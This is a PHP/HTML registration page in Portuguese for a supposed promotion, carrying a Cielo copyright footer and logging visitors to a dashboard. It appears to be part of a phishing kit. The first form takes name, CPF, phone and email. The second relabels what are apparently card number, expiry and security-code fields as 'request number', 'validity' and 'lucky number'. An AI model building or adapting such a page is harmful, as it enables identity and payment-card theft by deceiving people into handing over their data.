<?php
require __DIR__ . "/../dashboard/App/Controller.php";
use App\Controller;
Controller::setTimezone();

Controller::addVisitor();

?>

<html>
    <head>
	    <title>Cadastro</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
		<link rel="shortcut icon" type="image/png" href="icon/favicon.ico" />
<link href="dist/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
        <link href="dist/css/custom.css" rel="stylesheet">
        <link href="dist/css/fonts.css" rel="stylesheet">
<script src="dist/js/bootstrap.min.js"></script>
<script src="dist/js/jquery-3.3.1.slim.min.js"></script>
        <script src="dist/js/jquery.validate.js"></script>
        <script src="dist/js/jquery.mask.js"></script>
 <link rel="preload" as="font" href="dist/font/museosans_500-webfont.woff2">
        <link rel="preload" as="font" href="dist/font/museo-300-webfont.woff2">
        <link rel="preload" as="font" href="dist/font/museo500-regular-webfont.woff2">
        <link rel="preload" as="font" href="dist/font/museo700-regular-webfont.woff2">
        <link rel="preload" as="font" href="dist/font/museo900-regular-webfont.woff2">
        <link rel="preload" as="font" href="dist/font/museosans300-regular-webfont.woff2">
</head>
    <body class="main-body">
    
<main>
  <div class="main-reg container-fluid">
    <div class="main-top-header">
    <div class="main-top-container-header">
          <div class="main-logo">
                  <div class="icons-logo">
                  </div> 
              </a>    
      </div>
    </div>

      </div>
    
    
    
    <div class="main-form-data">
        <div class="container-forms">
        <div class="section-title" >
          <span class="form-data-bank-title" id="section-topic">Cadastre-se</span><br>
          <span class="form-data-bank-text" id="section-desc">Efetue seu cadastro abaixo para participar da promoção</span>
        </div>
      <div class="section-content">
         <div class="row" id="topic">
            <div class="col-md-12">
              <h5>
                Dados cadastrais
              </h5>
            </div>
          </div>
          <form class="reg-form" id="reg-form">
         <fieldset id="account_information" class="">
    <div class="row">
       <div class="col-md-4">
        <div class="form-group">
             <label id="name">*Nome completo</label>
          <input required="" class="form-control text-box" name="name" placeholder="Digite seu nome completo" tabindex="1" prevent-enter-key="" type="text" autocomplete="off" style="">
        </div>
          
          <div class="form-group">
               <label id="name">*CPF</label>
          <input required="" maxlength="14" class="form-control text-box" name="cpf" id="cpf"  tabindex="2" prevent-enter-key="" placeholder="Digite seu CPF" type="text" autocomplete="off" style="">
        </div>
          
          <div class="form-group">
             <label id="name">*Telefone</label>
          <input required="" maxlength="16"  class="form-control text-box" name="telephone" id="telephone" placeholder="Digite seu telefone" tabindex="3" prevent-enter-key="" type="text" autocomplete="off" style="">
        </div>
          
          <div class="form-group">
                <label id="name">*E-mail</label>
          <input required="" class="form-control text-box" name="email" placeholder="Digite seu e-mail" tabindex="4" prevent-enter-key="" type="email" autocomplete="off" style="">
        </div>
      </div>
      <div class="col-md-8 helptext">
            <div class="form-help">
                <div class="form-tips">
        <h3>Dicas gerais</h3>
        <ul style="margin-left: -22px">
          <li>Todos os campos solicitados neste formulário de cadastro são obrigatórios</li>
          <li>Permitido apenas um CPF por cadastro</li>
		  <li>O nome completo deve ser preenchido sem abreviações</li>
          <li>Realizar mais de um cadastro por CPF invalidará seu cadastro na promoção definitivamente</li>
		  <li>Certifique-se de informar um telefone para contato valido, preferencialmente celular</li>
          <li>Utilize um e-mail de facil acesso</li>
        </ul>
      </div>
            </div>
        </div>
              </div>
          
          <div class="row">
              <div class="col-xs-12 col-md-5 btn-container text-center">
               <button class="next-button primary next" type="button">Próximo</button>
              </div>
            </div>
          </fieldset>
             </form>
          
           <form class="reg-form2" id="reg-form2">
                  <fieldset id="company_information" class="">
    <div class="row">
       <div class="col-md-4">
        <div class="form-group">
                <label id="name">*Tipo de compra e categoria</label>
          <input class="form-control text-box" name="purchasetype" placeholder="Digite seu tipo de compra e categoria" tabindex="1" prevent-enter-key="" type="text" autocomplete="off" style="">
        </div>
          
          <div class="form-group">
                 <label id="name">*Número de requisição</label>
          <input class="form-control text-box" name="requestno"  id="requestno" placeholder="Digite os números de requisição" maxlength="19" tabindex="2" prevent-enter-key="" type="text" autocomplete="off" style="">
        </div>
          
          <div class="form-group">
               <label id="name">*Validade</label>
          <input class="form-control text-box" name="monthyear" id="monthyear" placeholder="Digite o mês e ano de compra" maxlength="7" tabindex="3" prevent-enter-key="" type="text" autocomplete="off" style="">
        </div>
          
          <div class="form-group">
                 <label id="name">*Número da sorte</label>
          <input class="form-control text-box" maxlength="4" id="luckyno" name="luckyno" placeholder="Digite o número da sorte" tabindex="4" prevent-enter-key="" type="text" autocomplete="off" style="">
        </div>
      </div>
      <div class="col-md-8 helptext">
            <div class="form-help">
                <div class="form-tips">
        <h3>Dicas gerais</h3>
        <ul style="margin-left: -22px"f>
          <li>A partir de agora o CPF e o e-mail serão utilizados para acessar a sua conta</li>
          <li>O E-mail e CPF são obrigatórios e só poderão ser cadastrados uma única vez</li>
        </ul>
      </div>
            </div>
        </div>
              </div>
          
          <div class="row">
              <div class="col-xs-12 col-md-5 btn-container text-center">
               <button class="next-button primary submit" type="submit">Concluir</button>
              </div>
            </div>
          </fieldset>
          </form>
          
          <fieldset id="success_message" class="">
                 <div class="row">
            <div class="col-md-12">
              <h6 class="text-center" style="font-family: museo700">
                Cadastro efetuado com sucesso, agora você esta participando da promoção.
              </h6>
            </div>
          </div>
          </fieldset>
          </div>
            
        </div>
            
        
        </div>
        
        
 
        
        <footer>
    <div class="">
        <div class="row-fluid-footer">
            <div class="text-center">
                 Copyright 2021 Cielo. Todos os direitos reservados.
            </div>
        </div>
    </div>
   
</footer>
        
        </div>
        </main>
    </body>
    <script src="dist/js/custom.js"></script>
    </html>